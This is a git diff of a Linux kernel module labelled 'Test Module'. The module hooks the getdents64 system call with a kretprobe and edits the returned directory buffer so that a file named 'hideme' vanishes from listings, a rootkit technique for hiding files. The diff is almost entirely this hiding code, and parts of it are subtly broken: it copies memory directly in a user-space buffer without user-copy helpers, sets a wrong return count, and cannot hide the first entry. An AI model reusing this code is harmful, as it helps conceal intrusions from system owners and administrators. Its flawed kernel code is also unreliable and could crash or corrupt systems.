@@ -14,13 +14,18 @@
 const char* hide_file_name = "hideme";
 const char* hide_pid_path = "/3504/fd";
 
+struct filter_data {
+    unsigned long hide_entry_offset;
+    unsigned long hide_entry_size;
+};
+
 typedef bool (*entry_filter_t)(struct linux_dirent64*, void* data);
 
 /// hide directory entries from result buffer
 /// @buffer is the result buffer to store @refitem linux_dirent64
 /// @size of buffer in bytes
 /// @return new buffer size
-static unsigned long hide_entry(void* buffer, unsigned long size, entry_filter_t entryFilter, void* data);
+static struct filter_data hide_entry(void* buffer, unsigned long size, entry_filter_t entryFilter, void* data);
 
 
 static struct kretprobe kretp = {
@@ -29,7 +34,7 @@ static struct kretprobe kretp = {
 
 struct getdent64_arguments {
     unsigned int fd;
-    __user void* buffer_ptr;
+    void* buffer_ptr;
     unsigned int count;
 };
 
@@ -65,14 +70,33 @@ static int handler_pre(struct kretprobe_instance *ri, struct pt_regs *regs)
 static int handle_post(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
     struct getdent64_arguments* args = (struct getdent64_arguments*) ri->data;
-    unsigned long retval = regs_return_value(regs);
+    unsigned long buffer_count = regs_return_value(regs);
 
-    pr_info("getdents64 (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, retval);
+    struct filter_data filter_data = hide_entry(args->buffer_ptr, buffer_count, hide_entry_by_name, hide_file_name);
 
-    if(retval < 100 && retval > 0 ){
-        __user struct linux_dirent64* current_ent = (struct linux_dirent64* )(args->buffer_ptr);
+    pr_info("getdents64 (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
 
-        //pr_info("first name is %s\n", current_ent->d_name);
+    if(filter_data.hide_entry_offset > 0 && filter_data.hide_entry_size > 0) {
+        // ptr of entry
+        void* dest = args->buffer_ptr + filter_data.hide_entry_offset;
+        // ptr of next entry
+        void* src = dest + filter_data.hide_entry_size;
+        // count of entries from entry to hide to end
+        unsigned long count = buffer_count - filter_data.hide_entry_offset - filter_data.hide_entry_size;
+
+        if(count == 0){
+            // nothing to copy it is last entry
+            regs_set_return_value(regs, buffer_count - filter_data.hide_entry_size);
+        }
+        else {
+            // offset     2
+            // nextOffset 3
+            // [0, 1, 2, 3, 4]
+            // -----[        ] dest
+            // --------[     ] source
+            memcpy(dest, src, count);
+            regs_set_return_value(regs, count);
+        }
     }
 
 //    unsigned long offset = 0;
@@ -158,33 +182,22 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Yarin");
 MODULE_DESCRIPTION("Test Module");
 
-unsigned long hide_entry(void* buffer, unsigned long size, entry_filter_t entryFilter, void* data){
-    unsigned long offset = 0;
+struct filter_data hide_entry(void* buffer, unsigned long size, entry_filter_t entryFilter, void* data){
+    struct filter_data filter_data;
 
-    unsigned long hide_entry_offset = -1;
-    unsigned long hide_entry_size = 0;
+    unsigned long offset = 0;
 
     // find entry to hide
     while(offset < size){
         struct linux_dirent64* current_ent = (struct linux_dirent64* )(buffer + offset);
         if(entryFilter(current_ent, data) == true){
-            hide_entry_offset = offset;
-            hide_entry_size = current_ent->d_reclen;
-            pr_info("hiding %s\n", current_ent->d_name);
-            break;
+            filter_data.hide_entry_offset = offset;
+            filter_data.hide_entry_size = current_ent->d_reclen;
+            return filter_data;
         }
         offset += current_ent->d_reclen;
     }
-
-    if(hide_entry_offset > 0) {
-        // offset     2
-        // nextOffset 3
-        // [0, 1, 2, 3, 4]
-        // -----[        ] dest
-        // --------[     ] source
-        memcpy(buffer + hide_entry_offset,  buffer + hide_entry_offset + hide_entry_size, (size - hide_entry_offset - hide_entry_size));
-        return size - hide_entry_size;
-    }
-
-    return size;
+    filter_data.hide_entry_offset = -1;
+    filter_data.hide_entry_size = 0;
+    return filter_data;
 }
